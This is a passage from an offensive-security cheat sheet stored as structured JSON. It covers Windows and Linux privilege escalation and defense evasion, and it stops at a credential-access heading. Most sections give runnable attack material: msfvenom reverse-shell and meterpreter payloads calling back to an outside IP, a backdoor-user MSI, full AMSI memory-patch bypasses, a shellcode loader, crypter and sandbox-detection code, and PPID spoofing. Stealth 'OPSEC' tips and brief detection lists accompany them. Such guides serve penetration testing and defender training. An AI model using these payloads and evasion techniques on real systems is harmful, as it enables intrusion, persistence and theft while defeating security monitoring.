              "language": "bash",
              "text": "# Download and compile exploit\nwget https://github.com/SecWiki/windows-kernel-exploits/raw/master/MS16-032/MS16-032.rar\nunrar x MS16-032.rar\ncd MS16-032\ni686-w64-mingw32-gcc MS16-032.c -o MS16-032.exe\n\n# Upload and execute\nmeterpreter > upload MS16-032.exe\nmeterpreter > shell\nC:\\> MS16-032.exe"
            },
            {
              "type": "p",
              "parts": [
                "**Linux kernel exploits:**"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "# Linux Exploit Suggester\n./linux-exploit-suggester.sh\n\n# DirtyCow (CVE-2016-5195)\ngcc -pthread dirty.c -o dirty -lcrypt\n./dirty\n\n# DirtyPipe (CVE-2022-0847)\ngcc dirtypipe.c -o dirtypipe\n./dirtypipe"
            },
            {
              "type": "h4",
              "text": "What to Expect"
            },
            {
              "type": "p",
              "parts": [
                {
                  "type": "inline_code",
                  "text": "SYSTEM"
                },
                " privileges if successful. System instability or crashes if failed. May trigger antivirus/",
                "**EDR**",
                "."
              ]
            },
            {
              "type": "h4",
              "text": "Detection / Hardening"
            },
            {
              "type": "ul",
              "items": [
                {
                  "parts": [
                    "Regular patching and updates"
                  ]
                },
                {
                  "parts": [
                    "**EDR**",
                    " kernel-level monitoring"
                  ]
                },
                {
                  "parts": [
                    "Driver signature enforcement"
                  ]
                },
                {
                  "parts": [
                    "Kernel Patch Protection (",
                    "**PatchGuard**",
                    ")"
                  ]
                },
                {
                  "parts": [
                    "System crash analysis"
                  ]
                }
              ]
            },
            {
              "type": "h4",
              "text": "Tools / References"
            },
            {
              "type": "p",
              "parts": [
                "**Windows-Exploit-Suggester**",
                ", ",
                "**Linux-Exploit-Suggester**",
                ", ",
                "**Metasploit**",
                ", ",
                "**ExploitDB**"
              ]
            },
            {
              "type": "h4",
              "text": "OPSEC / Notes"
            },
            {
              "type": "p",
              "parts": [
                "Test exploits in similar environment first. Have backup access methods. Consider system stability impact."
              ]
            },
            {
              "type": "h3",
              "text": "4.4 Unquoted Service Paths"
            },
            {
              "type": "h4",
              "text": "What It Is / Why It Matters"
            },
            {
              "type": "p",
              "parts": [
                "Windows services with unquoted paths containing spaces can be hijacked by placing malicious executables in earlier path components."
              ]
            },
            {
              "type": "h4",
              "text": "Quick Steps / Commands"
            },
            {
              "type": "p",
              "parts": [
                "**Find unquoted service paths:**"
              ]
            },
            {
              "type": "code",
              "language": "cmd",
              "text": "# Using wmic\nwmic service get name,displayname,pathname,startmode | findstr /i auto | findstr /i /v \"c:\\windows\\\\\" | findstr /i /v \"\"\"\n\n# Using PowerShell\nGet-WmiObject -Class Win32_Service | Where-Object {$_.PathName -notlike '\"*\"'} | Select-Object Name, PathName\n\n# Manual checking\nsc qc \"ServiceName\""
            },
            {
              "type": "p",
              "parts": [
                "**Identify writable directories:**"
              ]
            },
            {
              "type": "code",
              "language": "cmd",
              "text": "# Check permissions on directories\nicacls \"C:\\Program Files\\Vulnerable App\"\naccesschk.exe -uwdq \"C:\\Program Files\\Vulnerable App\"\n\n# Using PowerShell\nGet-Acl \"C:\\Program Files\\Vulnerable App\" | Format-List"
            },
            {
              "type": "p",
              "parts": [
                "**Exploit example:**"
              ]
            },
            {
              "type": "code",
              "language": "cmd",
              "text": "# Service path: C:\\Program Files\\Vulnerable App\\service.exe\n# Place malware at: C:\\Program.exe\n\n# Or service path: C:\\Program Files\\Vulnerable Folder\\service.exe\n# Place malware at: C:\\Program Files\\Vulnerable.exe\n\ncopy malware.exe \"C:\\Program.exe\"\n# Service will try to run C:\\Program.exe instead of the intended executable"
            },
            {
              "type": "p",
              "parts": [
                "**Automated tools:**"
              ]
            },
            {
              "type": "code",
              "language": "powershell",
              "text": "# PowerSploit module\nImport-Module .\\PowerUp.ps1\nInvoke-AllChecks\n\n# WinPEAS for Windows\nwinpeas.exe quiet servicesinfo"
            },
            {
              "type": "h4",
              "text": "What to Expect"
            },
            {
              "type": "p",
              "parts": [
                "Service starts your executable instead of the legitimate one when restarted. Requires service restart or reboot."
              ]
            },
            {
              "type": "h4",
              "text": "Detection / Hardening"
            },
            {
              "type": "ul",
              "items": [
                {
                  "parts": [
                    "Monitor for executables in unusual locations"
                  ]
                },
                {
                  "parts": [
                    "Service executable digital signature verification"
                  ]
                },
                {
                  "parts": [
                    "Regular service path auditing"
                  ]
                },
                {
                  "parts": [
                    "**EDR**",
                    " detection of service path hijacking"
                  ]
                },
                {
                  "parts": [
                    "Quote all service paths in deployments"
                  ]
                }
              ]
            },
            {
              "type": "h4",
              "text": "Tools / References"
            },
            {
              "type": "p",
              "parts": [
                "**PowerUp**",
                ", ",
                "**WinPEAS**",
                ", ",
                "**AccessChk**",
                ", ",
                "**SC.exe**"
              ]
            },
            {
              "type": "h4",
              "text": "OPSEC / Notes"
            },
            {
              "type": "p",
              "parts": [
                "Use filenames that look legitimate. Time execution with service restarts. Clean up after exploitation."
              ]
            },
            {
              "type": "h3",
              "text": "4.5 DLL Hijacking"
            },
            {
              "type": "h4",
              "text": "What It Is / Why It Matters"
            },
            {
              "type": "p",
              "parts": [
                "Placing malicious DLLs where applications will load them instead of legitimate ones. Effective for privilege escalation when vulnerable applications run with higher privileges."
              ]
            },
            {
              "type": "h4",
              "text": "Quick Steps / Commands"
            },
            {
              "type": "p",
              "parts": [
                "**Find DLL hijacking opportunities:**"
              ]
            },
            {
              "type": "code",
              "language": "cmd",
              "text": "# Process Monitor for DLL search order\nprocmon.exe /AcceptEula /Quiet /BackingFile log.pml\n# Filters: Result is NAME NOT FOUND, Path ends with .dll\n\n# Manual checking with listdlls\nlistdlls.exe -d example.dll"
            },
            {
              "type": "p",
              "parts": [
                "**Common hijack locations:**"
              ]
            },
            {
              "type": "code",
              "language": "cmd",
              "text": "# Application directory (writable)\nC:\\Program Files\\VulnerableApp\\malicious.dll\n\n# Windows directories (if writable)\nC:\\Windows\\System32\\malicious.dll\nC:\\Windows\\SysWOW64\\malicious.dll\n\n# Current directory\n.\\malicious.dll"
            },
            {
              "type": "p",
              "parts": [
                "**Generate malicious DLL:**"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "# Meterpreter DLL\nmsfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.20 LPORT=443 -f dll > hijack.dll\n\n# Simple reverse shell DLL\nmsfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.20 LPORT=443 -f dll > hijack.dll"
            },
            {
              "type": "p",
              "parts": [
                "**DLL Proxying (maintain functionality):**"
              ]
            },
            {
              "type": "code",
              "language": "cpp",
              "text": "// Forward exports while adding malicious code\n#pragma comment(linker, \"/export:RealFunction=hijack.RealFunction\")"
            },
            {
              "type": "p",
              "parts": [
                "**PowerShell discovery:**"
              ]
            },
            {
              "type": "code",
              "language": "powershell",
              "text": "# Find missing DLLs\nGet-Process | ForEach-Object {\n    $_.Modules | Where-Object {$_.FileName -eq $null} | Select-Object ProcessName\n}\n\n# Check writable directories\nGet-ChildItem \"C:\\\" -Recurse -Directory | Get-Acl | Where-Object {$_.Access | Where-Object {$_.IdentityReference -eq \"BUILTIN\\Users\" -and $_.FileSystemRights -match \"Write\"}}"
            },
            {
              "type": "h4",
              "text": "What to Expect"
            },
            {
              "type": "p",
              "parts": [
                "Malicious DLL loads when the vulnerable application runs. Inherits the application's privileges. May cause application instability."
              ]
            },
            {
              "type": "h4",
              "text": "Detection / Hardening"
            },
            {
              "type": "ul",
              "items": [
                {
                  "parts": [
                    "DLL search order hardening"
                  ]
                },
                {
                  "parts": [
                    "Code signing verification"
                  ]
                },
                {
                  "parts": [
                    "Monitor DLL loads from unusual locations"
                  ]
                },
                {
                  "parts": [
                    "**EDR**",
                    " detection of known hijack patterns"
                  ]
                },
                {
                  "parts": [
                    "Protected processes (",
                    "**PPL**",
                    ")"
                  ]
                }
              ]
            },
            {
              "type": "h4",
              "text": "Tools / References"
            },
            {
              "type": "p",
              "parts": [
                "**Process Monitor**",
                ", DLL Export Viewer, ",
                "**PowerSploit**",
                ", ",
                "**Rattler**"
              ]
            },
            {
              "type": "h4",
              "text": "OPSEC / Notes"
            },
            {
              "type": "p",
              "parts": [
                "Test thoroughly to avoid crashes. Use DLL proxying for stealth. Target applications that run with elevated privileges."
              ]
            },
            {
              "type": "h3",
              "text": "4.6 Misconfigurations Exploitation"
            },
            {
              "type": "h4",
              "text": "What It Is / Why It Matters"
            },
            {
              "type": "p",
              "parts": [
                "Leveraging system misconfigurations like weak service permissions, insecure registry keys, or ",
                {
                  "type": "inline_code",
                  "text": "AlwaysInstallElevated"
                },
                " for privilege escalation."
              ]
            },
            {
              "type": "h4",
              "text": "Quick Steps / Commands"
            },
            {
              "type": "p",
              "parts": [
                "**Service permission checks:**"
              ]
            },
            {
              "type": "code",
              "language": "cmd",
              "text": "# Check service permissions with accesschk\naccesschk.exe -uwcqv \"Authenticated Users\" * /accepteula\naccesschk.exe -uwcqv \"Everyone\" * /accepteula\n\n# Check specific service\nsc qc \"VulnerableService\"\naccesschk.exe -ucqv VulnerableService"
            },
            {
              "type": "p",
              "parts": [
                "**AlwaysInstallElevated:**"
              ]
            },
            {
              "type": "code",
              "language": "cmd",
              "text": "# Check if AlwaysInstallElevated is enabled\nreg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n\n# Create malicious MSI\nmsfvenom -p windows/adduser USER=backdoor PASS=Password123! -f msi > setup.msi\n\n# Install MSI with system privileges\nmsiexec /quiet /qn /i setup.msi"
            },
            {
              "type": "p",
              "parts": [
                "**Unattended install files:**"
              ]
            },
            {
              "type": "code",
              "language": "cmd",
              "text": "# Find unattended installation files\ndir /s *unattend.xml\ndir /s *sysprep.inf\ndir /s *sysprep.xml\n\n# Check for credentials\ntype C:\\Windows\\Panther\\unattend.xml\nfindstr /S /I \"password\" *.xml *.ini *.txt"
            },
            {
              "type": "p",
              "parts": [
                "**PowerShell misconfiguration checks:**"
              ]
            },
            {
              "type": "code",
              "language": "powershell",
              "text": "# PowerUp for comprehensive checks\nImport-Module .\\PowerUp.ps1\nInvoke-AllChecks\n\n# Check for password in files\nGet-ChildItem C:\\ -Include *.txt,*.xml,*.ini -Recurse -ErrorAction SilentlyContinue | Select-String \"password\"\n\n# Check registry for passwords\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" 2>$null"
            },
            {
              "type": "p",
              "parts": [
                "**Scheduled task permissions:**"
              ]
            },
            {
              "type": "code",
              "language": "cmd",
              "text": "# Check scheduled task permissions\nschtasks /query /fo LIST /v\naccesschk.exe -quv \"System\" /accepteula"
            },
            {
              "type": "h4",
              "text": "What to Expect"
            },
            {
              "type": "p",
              "parts": [
                "Various privilege escalation paths depending on found misconfigurations. Often provides quick elevation without exploits."
              ]
            },
            {
              "type": "h4",
              "text": "Detection / Hardening"
            },
            {
              "type": "ul",
              "items": [
                {
                  "parts": [
                    "Regular security configuration audits"
                  ]
                },
                {
                  "parts": [
                    "Least privilege principle for services"
                  ]
                },
                {
                  "parts": [
                    "Disable ",
                    {
                      "type": "inline_code",
                      "text": "AlwaysInstallElevated"
                    }
                  ]
                },
                {
                  "parts": [
                    "Clean up unattended installation files"
                  ]
                },
                {
                  "parts": [
                    "Monitor for configuration changes"
                  ]
                }
              ]
            },
            {
              "type": "h4",
              "text": "Tools / References"
            },
            {
              "type": "p",
              "parts": [
                "**PowerUp**",
                ", ",
                "**WinPEAS**",
                ", ",
                "**AccessChk**",
                ", ",
                "**Seatbelt**"
              ]
            },
            {
              "type": "h4",
              "text": "OPSEC / Notes"
            },
            {
              "type": "p",
              "parts": [
                "Use built-in tools when possible. Avoid making unnecessary changes. Document found misconfigurations for reporting."
              ]
            },
            {
              "type": "h2",
              "text": "5. 🎭 Defense Evasion"
            },
            {
              "type": "h3",
              "text": "5.1 AMSI Bypass"
            },
            {
              "type": "h4",
              "text": "What It Is / Why It Matters"
            },
            {
              "type": "p",
              "parts": [
                "Bypassing the Anti-Malware Scan Interface (",
                "**AMSI**",
                ") to execute malicious PowerShell scripts without detection. Critical for running offensive tools in modern Windows environments."
              ]
            },
            {
              "type": "h4",
              "text": "Quick Steps / Commands"
            },
            {
              "type": "p",
              "parts": [
                "**Common AMSI bypass strings:**"
              ]
            },
            {
              "type": "code",
              "language": "powershell",
              "text": "# Basic AMSI bypass\n[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\n\n# Alternative method\n$Win32 = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n    [DllImport(\"kernel32\")]\n    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);\n    [DllImport(\"kernel32\")]\n    public static extern IntPtr LoadLibrary(string name);\n    [DllImport(\"kernel32\")]\n    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);\n}\n\"@\n\nAdd-Type $Win32\n$LoadLibrary = [Win32]::LoadLibrary(\"am\" + \"si.dll\")\n$Address = [Win32]::GetProcAddress($LoadLibrary, \"Amsi\" + \"Scan\" + \"Buffer\")\n$p = 0\n[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)\n$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)\n[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)"
            },
            {
              "type": "p",
              "parts": [
                "**Memory patch technique:**"
              ]
            },
            {
              "type": "code",
              "language": "powershell",
              "text": "# Patch AMSI in memory\n$MethodDefinition = @'\npublic static void Patch() {\n    var lib = LoadLibrary(\"amsi.dll\");\n    var addr = GetProcAddress(lib, \"AmsiScanBuffer\");\n\n    byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };\n    Marshal.Copy(patch, 0, addr, patch.Length);\n}\n'@\n\n$Type = Add-Type -MemberDefinition $MethodDefinition -Name \"AMSI\" -Namespace \"Bypass\" -PassThru\n$Type::Patch()"
            },
            {
              "type": "p",
              "parts": [
                "**Reflection-based bypass:**"
              ]
            },
            {
              "type": "code",
              "language": "powershell",
              "text": "# Using reflection to disable AMSI\n$ReflectedAssembly = [System.Reflection.Assembly]::GetExecutingAssembly()\n$AmsiUtils = $ReflectedAssembly.GetType('System.Management.Automation.AmsiUtils')\n$AmsiUtils.GetField('amsiContext', 'NonPublic,Static').SetValue($null, [IntPtr]::Zero)"
            },
            {
              "type": "h4",
              "text": "What to Expect"
            },
            {
              "type": "p",
              "parts": [
                "Ability to run previously detected PowerShell scripts and tools. May still be detected by advanced ",
                "**EDR**",
                " solutions."
              ]
            },
            {
              "type": "h4",
              "text": "Detection / Hardening"
            },
            {
              "type": "ul",
              "items": [
                {
                  "parts": [
                    "Monitor for ",
                    "**AMSI**",
                    " bypass patterns"
                  ]
                },
                {
                  "parts": [
                    "**EDR**",
                    " behavioral detection"
                  ]
                },
                {
                  "parts": [
                    "Constrained Language Mode"
                  ]
                },
                {
                  "parts": [
                    "PowerShell logging (ScriptBlock, Module)"
                  ]
                },
                {
                  "parts": [
                    "**AMSI**",
                    " provider updates"
                  ]
                }
              ]
            },
            {
              "type": "h4",
              "text": "Tools / References"
            },
            {
              "type": "p",
              "parts": [
                "**AMSI.fail**",
                ", ",
                "**PowerSploit**",
                ", ",
                "**Invoke-Obfuscation**"
              ]
            },
            {
              "type": "h4",
              "text": "OPSEC / Notes"
            },
            {
              "type": "p",
              "parts": [
                "Test bypasses against target ",
                "**EDR**",
                ". Use multiple techniques. Consider timing to avoid mass scanning."
              ]
            },
            {
              "type": "h3",
              "text": "5.2 AV/EDR Evasion"
            },
            {
              "type": "h4",
              "text": "What It Is / Why It Matters"
            },
            {
              "type": "p",
              "parts": [
                "Techniques to avoid detection by antivirus (",
                "**AV**",
                ") and endpoint detection and response (",
                "**EDR**",
                ") systems. Essential for maintaining access."
              ]
            },
            {
              "type": "h4",
              "text": "Quick Steps / Commands"
            },
            {
              "type": "p",
              "parts": [
                "**Payload obfuscation:**"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "# Veil-Evasion for AV evasion\nveil-evasion\n> use powershell/meterpreter/rev_http\n> set LHOST 10.10.14.20\n> generate\n\n# Shellter for dynamic payload injection\nshellter -a -f /usr/share/windows-binaries/plink.exe -p meterpreter_reverse_tcp"
            },
            {
              "type": "p",
              "parts": [
                "**Donut for in-memory execution:**"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "# Convert PE to shellcode\ndonut -a 2 -b 1 -o payload.bin malware.exe\n\n# Execute from memory\ndonut shellcode_loader.exe -p payload.bin"
            },
            {
              "type": "p",
              "parts": [
                "**Process hollowing:**"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "# Create suspended process and inject payload\n# Common targets: svchost.exe, notepad.exe\nmsfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.20 LPORT=443 -f raw > shellcode.bin"
            },
            {
              "type": "p",
              "parts": [
                "**Custom loaders:**"
              ]
            },
            {
              "type": "code",
              "language": "csharp",
              "text": "// C# shellcode loader\nbyte[] shellcode = new byte[] { 0xfc, 0x48, 0x83... };\n\nvar memory = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length,\n    MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\nMarshal.Copy(shellcode, 0, memory, shellcode.Length);\n\nvar thread = CreateThread(IntPtr.Zero, 0, memory, IntPtr.Zero, 0, IntPtr.Zero);\nWaitForSingleObject(thread, 0xFFFFFFFF);"
            },
            {
              "type": "h4",
              "text": "What to Expect"
            },
            {
              "type": "p",
              "parts": [
                "Reduced detection rates for payloads. May require multiple iterations to achieve full evasion."
              ]
            },
            {
              "type": "h4",
              "text": "Detection / Hardening"
            },
            {
              "type": "ul",
              "items": [
                {
                  "parts": [
                    "Behavioral analysis"
                  ]
                },
                {
                  "parts": [
                    "Memory scanning"
                  ]
                },
                {
                  "parts": [
                    "Process integrity checks"
                  ]
                },
                {
                  "parts": [
                    "**EDR**",
                    " telemetry correlation"
                  ]
                },
                {
                  "parts": [
                    "Machine learning detection"
                  ]
                }
              ]
            },
            {
              "type": "h4",
              "text": "Tools / References"
            },
            {
              "type": "p",
              "parts": [
                "**Veil**",
                ", ",
                "**Shellter**",
                ", ",
                "**Donut**",
                ", ",
                "**Cobalt Strike**",
                ", ",
                "**Mythic**"
              ]
            },
            {
              "type": "h4",
              "text": "OPSEC / Notes"
            },
            {
              "type": "p",
              "parts": [
                "Test against target ",
                "**AV/EDR**",
                ". Use custom crypters. Avoid public payloads."
              ]
            },
            {
              "type": "h3",
              "text": "5.3 Obfuscation"
            },
            {
              "type": "h4",
              "text": "What It Is / Why It Matters"
            },
            {
              "type": "p",
              "parts": [
                "Making code and commands difficult to analyze and detect through various transformation techniques."
              ]
            },
            {
              "type": "h4",
              "text": "Quick Steps / Commands"
            },
            {
              "type": "p",
              "parts": [
                "**PowerShell obfuscation:**"
              ]
            },
            {
              "type": "code",
              "language": "powershell",
              "text": "# String reversal and encoding\n'whoami' | .( $eNv:CoMsPeC[4,15,25]-JoIN'')\n\n# Invoke-Obfuscation\nImport-Module Invoke-Obfuscation\nInvoke-Obfuscation -ScriptBlock { whoami } -Command 'Token\\All\\1' -Quiet\n\n# Base64 encoding\n$command = \"whoami\"\n$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)\n$encoded = [Convert]::ToBase64String($bytes)\npowershell -enc $encoded"
            },
            {
              "type": "p",
              "parts": [
                "**Binary obfuscation:**"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "# UPX packing\nupx -9 malware.exe\n\n# Hyperion encryption\nwine hyperion.exe -v malware.exe malware_encrypted.exe"
            },
            {
              "type": "p",
              "parts": [
                "**JavaScript obfuscation:**"
              ]
            },
            {
              "type": "code",
              "language": "javascript",
              "text": "// Obfuscated JavaScript\nvar _0xa0e9=[\"\\x77\\x68\\x6F\\x61\\x6D\\x69\"];function _0xae84(){return _0xa0e9[0];}eval(_0xae84());\n\n// Using obfuscator.io\n// Online tool for JavaScript obfuscation"
            },
            {
              "type": "h4",
              "text": "What to Expect"
            },
            {
              "type": "p",
              "parts": [
                "Reduced static detection rates. May impact performance. Some techniques are easily reversed."
              ]
            },
            {
              "type": "h4",
              "text": "Detection / Hardening"
            },
            {
              "type": "ul",
              "items": [
                {
                  "parts": [
                    "Deobfuscation engines"
                  ]
                },
                {
                  "parts": [
                    "Behavioral analysis"
                  ]
                },
                {
                  "parts": [
                    "Entropy analysis"
                  ]
                },
                {
                  "parts": [
                    "**AMSI**",
                    " scanning"
                  ]
                },
                {
                  "parts": [
                    "**EDR**",
                    " pattern recognition"
                  ]
                }
              ]
            },
            {
              "type": "h4",
              "text": "Tools / References"
            },
            {
              "type": "p",
              "parts": [
                "**Invoke-Obfuscation**",
                ", ",
                "**UPX**",
                ", ",
                "**Hyperion**",
                ", ",
                "**Obfuscator.io**"
              ]
            },
            {
              "type": "h4",
              "text": "OPSEC / Notes"
            },
            {
              "type": "p",
              "parts": [
                "Balance obfuscation with functionality. Test against target security controls."
              ]
            },
            {
              "type": "h3",
              "text": "5.4 Binary Packing/Stubbing"
            },
            {
              "type": "h4",
              "text": "What It Is / Why It Matters"
            },
            {
              "type": "p",
              "parts": [
                "Wrapping malicious binaries in encrypted layers to avoid signature detection while maintaining functionality."
              ]
            },
            {
              "type": "h4",
              "text": "Quick Steps / Commands"
            },
            {
              "type": "p",
              "parts": [
                "**Custom packers:**"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "# sRDI for converting DLLs to position-independent shellcode\npython ConvertToShellcode.py malware.dll\n\n# PE2SHC for PE to shellcode conversion\npython pe2shc.py malware.exe shellcode.c"
            },
            {
              "type": "p",
              "parts": [
                "**Crypter development:**"
              ]
            },
            {
              "type": "code",
              "language": "csharp",
              "text": "// Simple XOR crypter in C#\nbyte[] key = { 0x01, 0x02, 0x03, 0x04 };\nbyte[] encrypted = new byte[payload.Length];\n\nfor (int i = 0; i < payload.Length; i++) {\n    encrypted[i] = (byte)(payload[i] ^ key[i % key.Length]);\n}\n\nFile.WriteAllBytes(\"encrypted.bin\", encrypted);"
            },
            {
              "type": "p",
              "parts": [
                "**Stub execution:**"
              ]
            },
            {
              "type": "code",
              "language": "csharp",
              "text": "// Stub that decrypts and executes in memory\nbyte[] encrypted = File.ReadAllBytes(\"encrypted.bin\");\nbyte[] decrypted = new byte[encrypted.Length];\n\nfor (int i = 0; i < encrypted.Length; i++) {\n    decrypted[i] = (byte)(encrypted[i] ^ key[i % key.Length]);\n}\n\n// Execute decrypted payload in memory"
            },
            {
              "type": "h4",
              "text": "What to Expect"
            },
            {
              "type": "p",
              "parts": [
                "Evasion of signature-based detection. Potential performance overhead."
              ]
            },
            {
              "type": "h4",
              "text": "Detection / Hardening"
            },
            {
              "type": "ul",
              "items": [
                {
                  "parts": [
                    "Memory analysis"
                  ]
                },
                {
                  "parts": [
                    "Entropy detection"
                  ]
                },
                {
                  "parts": [
                    "Emulation/sandboxing"
                  ]
                },
                {
                  "parts": [
                    "Behavioral monitoring"
                  ]
                },
                {
                  "parts": [
                    "Packers detection"
                  ]
                }
              ]
            },
            {
              "type": "h4",
              "text": "Tools / References"
            },
            {
              "type": "p",
              "parts": [
                "**sRDI**",
                ", ",
                "**PE2SHC**",
                ", custom crypters, commercial packers"
              ]
            },
            {
              "type": "h4",
              "text": "OPSEC / Notes"
            },
            {
              "type": "p",
              "parts": [
                "Use unique keys per target. Test stability thoroughly."
              ]
            },
            {
              "type": "h3",
              "text": "5.5 Time-based Evasion"
            },
            {
              "type": "h4",
              "text": "What It Is / Why It Matters"
            },
            {
              "type": "p",
              "parts": [
                "Delaying or timing malicious activity to avoid automated analysis and detection systems."
              ]
            },
            {
              "type": "h4",
              "text": "Quick Steps / Commands"
            },
            {
              "type": "p",
              "parts": [
                "**Sleep obfuscation:**"
              ]
            },
            {
              "type": "code",
              "language": "powershell",
              "text": "# API-based sleep to avoid Sleep() hooking\nAdd-Type -TypeDefinition @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic static class Kernel32 {\n    [DllImport(\"kernel32.dll\")]\n    public static extern void Sleep(uint dwMilliseconds);\n\n    [DllImport(\"kernel32.dll\")]\n    public static extern IntPtr GetTickCount();\n}\n\"@\n\n# Use GetTickCount for timing\n$start = [Kernel32]::GetTickCount()\ndo {\n    [Kernel32]::Sleep(100)\n} while (([Kernel32]::GetTickCount() - $start) -lt 30000)"
            },
            {
              "type": "p",
              "parts": [
                "**Random delays:**"
              ]
            },
            {
              "type": "code",
              "language": "powershell",
              "text": "# Random sleep intervals\n$sleepTime = Get-Random -Minimum 10000 -Maximum 30000\nStart-Sleep -Milliseconds $sleepTime\n\n# Jitter in C2 beacons\nbeacon> sleep 60000\nbeacon> jitter 25"
            },
            {
              "type": "p",
              "parts": [
                "**Sandbox detection:**"
              ]
            },
            {
              "type": "code",
              "language": "powershell",
              "text": "# Check uptime (sandboxes often have low uptime)\n$uptime = (Get-Date) - (Get-CimInstance Win32_OperatingSystem).LastBootUpTime\nif ($uptime.TotalMinutes -lt 30) { exit }\n\n# Check resources (sandboxes often have limited resources)\n$memory = Get-CimInstance Win32_ComputerSystem | Select-Object TotalPhysicalMemory\nif ($memory.TotalPhysicalMemory -lt 4GB) { exit }"
            },
            {
              "type": "h4",
              "text": "What to Expect"
            },
            {
              "type": "p",
              "parts": [
                "Bypass of automated sandbox analysis. Delayed but more reliable execution."
              ]
            },
            {
              "type": "h4",
              "text": "Detection / Hardening"
            },
            {
              "type": "ul",
              "items": [
                {
                  "parts": [
                    "Long-term behavioral analysis"
                  ]
                },
                {
                  "parts": [
                    "Timing correlation"
                  ]
                },
                {
                  "parts": [
                    "Resource monitoring"
                  ]
                },
                {
                  "parts": [
                    "**EDR**",
                    " persistence"
                  ]
                }
              ]
            },
            {
              "type": "h4",
              "text": "Tools / References"
            },
            {
              "type": "p",
              "parts": [
                "**Cobalt Strike**",
                ", ",
                "**Metasploit**",
                ", custom timing logic"
              ]
            },
            {
              "type": "h4",
              "text": "OPSEC / Notes"
            },
            {
              "type": "p",
              "parts": [
                "Balance evasion with operational needs. Consider engagement timeline."
              ]
            },
            {
              "type": "h3",
              "text": "5.6 Masquerading"
            },
            {
              "type": "h4",
              "text": "What It Is / Why It Matters"
            },
            {
              "type": "p",
              "parts": [
                "Disguising malicious processes and files as legitimate system components to avoid suspicion."
              ]
            },
            {
              "type": "h4",
              "text": "Quick Steps / Commands"
            },
            {
              "type": "p",
              "parts": [
                "**Process name spoofing:**"
              ]
            },
            {
              "type": "code",
              "language": "cmd",
              "text": "# Copy to system directory with legitimate name\ncopy malware.exe \"C:\\Windows\\System32\\svchost.exe -k netsvcs\"\n\n# Use explorer.exe as parent\nstart /B malware.exe"
            },
            {
              "type": "p",
              "parts": [
                "**Parent process spoofing:**"
              ]
            },
            {
              "type": "code",
              "language": "csharp",
              "text": "// C# code for PPID spoofing\nvar parent = Process.GetProcessesByName(\"explorer\").First();\nvar processInfo = new PROCESS_INFORMATION();\nvar startupInfo = new STARTUPINFOEX();\n\nstartupInfo.StartupInfo.cb = Marshal.SizeOf(typeof(STARTUPINFOEX));\nstartupInfo.lpAttributeList = IntPtr.Zero;\n\nInitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref size);\nstartupInfo.lpAttributeList = Marshal.AllocHGlobal(size);\nInitializeProcThreadAttributeList(startupInfo.lpAttributeList, 1, 0, ref size);\n\nUpdateProcThreadAttribute(\n    startupInfo.lpAttributeList, 0,\n    (IntPtr)PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,\n    parent.Handle, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);\n\nCreateProcess(null, \"malware.exe\", IntPtr.Zero, IntPtr.Zero,\n    false, EXTENDED_STARTUPINFO_PRESENT, IntPtr.Zero, null,\n    ref startupInfo, out processInfo);"
            },
            {
              "type": "p",
              "parts": [
                "**File attribute manipulation:**"
              ]
            },
            {
              "type": "code",
              "language": "cmd",
              "text": "# Set file attributes to hidden\nattrib +h +s malware.exe\n\n# Modify timestamps (timestomp)\ncopy /b malware.exe +,, C:\\Windows\\System32\\malware.exe"
            },
            {
              "type": "h4",
              "text": "What to Expect"
            },
            {
              "type": "p",
              "parts": [
                "Reduced visibility in process lists and file explorers. May bypass basic security checks."
              ]
            },
            {
              "type": "h4",
              "text": "Detection / Hardening"
            },
            {
              "type": "ul",
              "items": [
                {
                  "parts": [
                    "Process ancestry analysis"
                  ]
                },
                {
                  "parts": [
                    "File integrity monitoring"
                  ]
                },
                {
                  "parts": [
                    "Digital signature verification"
                  ]
                },
                {
                  "parts": [
                    "**EDR**",
                    " behavioral detection"
                  ]
                },
                {
                  "parts": [
                    "Parent-child process correlation"
                  ]
                }
              ]
            },
            {
              "type": "h4",
              "text": "Tools / References"
            },
            {
              "type": "p",
              "parts": [
                "**Cobalt Strike**",
                ", ",
                "**Metasploit**",
                ", custom spoofing tools"
              ]
            },
            {
              "type": "h4",
              "text": "OPSEC / Notes"
            },
            {
              "type": "p",
              "parts": [
                "Use legitimate-looking names and paths. Test against target monitoring."
              ]
            },
            {
              "type": "h2",
              "text": "6. 🔐 Credential Access"
            },
            {
              "type": "h3",
              "text": "6.1 Mimikatz / LaZagne / Rubeus"
            },
            {
              "type": "h4",
              "text": "What It Is / Why It Matters"
            },
            {
              "type": "p",
              "parts": [
                "Extracting credentials from memory, tickets, and system stores for lateral movement and privilege escalation."
              ]
            },
            {
              "type": "h4",
              "text": "Quick Steps / Commands"
            },
